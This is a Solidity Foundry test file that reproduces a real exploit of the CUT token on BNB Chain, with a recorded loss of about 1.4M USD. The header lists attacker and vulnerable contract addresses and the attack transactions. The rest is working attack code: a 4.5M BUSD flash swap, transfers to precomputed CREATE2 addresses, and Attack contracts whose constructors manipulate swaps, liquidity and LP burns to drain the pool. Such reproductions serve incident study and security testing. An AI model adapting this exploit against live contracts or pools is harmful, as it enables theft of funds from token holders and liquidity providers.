// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;


import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~1.4M USD
// Attacker : 0x5766d1F03378f50c7c981c014Ed5e5A8124f38A4
// Attack Contract : 0x87EFb39a716860eCd2324A944Cb40EC5128e56Dd, 0xD9ad954Bea4ad65578904CEFE6Ee2A6EB13879dB
// Vulnerable Contract : 0x7057f3b0f4d0649b428f0d8378a8a0e7d21d36a7, 0x7b2e7cb89824236cb7096cde7a153af30f3ecbaf
// Attack Tx : 
// 0x2c123d08ca3d50c4b875c0b5de1b5c85d0bf9979dffbf87c48526e3a67396827
// 0xce6e474dc9555ef971473fee19f87716f38ba01a0df39e78207b71eda134c420
// 0x6262c0f15c88aed6f646ed1996eb6aae9ccc5d5704d5faccd1e1397dd047bc8a

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x7b2e7cb89824236cb7096cde7a153af30f3ecbaf(unveriified)

// @Analysis
// https://www.certik.com/zh-CN/resources/blog/caterpillar-coin-cut-token-incident-analysis

contract ContractTest is Test {
    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 CUT = IERC20(0x7057F3b0F4D0649B428F0D8378A8a0E7D21d36a7);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IUniswapV2Factory Factory = IUniswapV2Factory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);
    Uni_Pair_V2 WBNBUSDT2 = Uni_Pair_V2(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
    Uni_Pair_V2 BUSDCUT = Uni_Pair_V2(0x83681F67069A154815a0c6C2C97e2dAca6eD3249);

    

    uint256 borrow_amount;


    function setUp() external 
    {
        cheats.createSelectFork("bsc", 42131697 - 1);
    }

    function testExploit() external {

        emit log_named_decimal_uint("[Begin] Attacker BUSD before exploit", BUSD.balanceOf(address(this)), 18);

        borrow_amount = 4_500_000 ether;

        WBNBUSDT2.swap(
            borrow_amount,
            0,
            address(this), 
            "0x0000000000000000000000000000000000000000000000000000000000000001"
        );


        emit log_named_decimal_uint("[End] Attacker BUSD after exploit", BUSD.balanceOf(address(this)), 18);
    }

    function pancakeCall(
        address _sender,
        uint _amount0,
        uint _amount1,
        bytes calldata _data
    ) external {

        for(uint256 i=0; i< 10; i++){
            uint256 att_bal = BUSD.balanceOf(address(BUSDCUT)) * 3;
            address att_addr = calAddress(i);
            BUSD.transfer(att_addr, att_bal);
            createContract(i);
        }

        // payback
        BUSD.transfer(msg.sender, ((borrow_amount / 9975) * 10_000) + 10_000);
    }

    function calAddress(uint256 _salt) internal returns(address){

        bytes memory bytecode = type(Attack).creationCode;
        bytecode = abi.encodePacked(bytecode);
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
        address hack_contract =  address(uint160(uint256(hash)));
        return hack_contract;

    }

    function createContract(uint256 _salt) internal returns(address) {

        bytes memory bytecode = type(Attack).creationCode;
        bytecode = abi.encodePacked(bytecode);
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
        address hack_contract =  address(uint160(uint256(hash)));
        address addr;
        // Use create2 to Send money first.
        assembly {
            addr := create2(0, add(bytecode, 0x20), mload(bytecode), _salt)
        }

        return hack_contract;

        
    }


    receive() external payable {
        
    }
}

contract Attack{

    Uni_Pair_V2 BUSDCUT = Uni_Pair_V2(0x83681F67069A154815a0c6C2C97e2dAca6eD3249);
    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 CUT = IERC20(0x7057F3b0F4D0649B428F0D8378A8a0E7D21d36a7);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    constructor(){
        uint256 busd_bal = BUSD.balanceOf(address(this));
        BUSD.approve(address(Router), type(uint256).max);
        CUT.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(BUSD);
        path[1] = address(CUT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
           busd_bal * 7/10 , 0, path, address(this), block.timestamp + 1
        );
        uint256 busd_bal_new = BUSD.balanceOf(address(this));
        uint256 cut_bal = CUT.balanceOf(address(this));
        Router.addLiquidity(
            address(BUSD), address(CUT), busd_bal_new * 3/10, cut_bal, 0, 0, address(this), block.timestamp + 1
        );

        uint256 cut_bal_new = CUT.balanceOf(address(this));
        path[0] = address(CUT);
        path[1] = address(BUSD);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
           cut_bal_new , 0, path, address(this), block.timestamp + 1
        );

        BUSDCUT.transfer(address(BUSDCUT), BUSDCUT.balanceOf(address(this)));
        BUSDCUT.burn(address(this));

        cut_bal_new = CUT.balanceOf(address(this));
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
           cut_bal_new , 0, path, address(this), block.timestamp + 1
        );

        BUSD.transfer(msg.sender, BUSD.balanceOf(address(this)));

    }
}

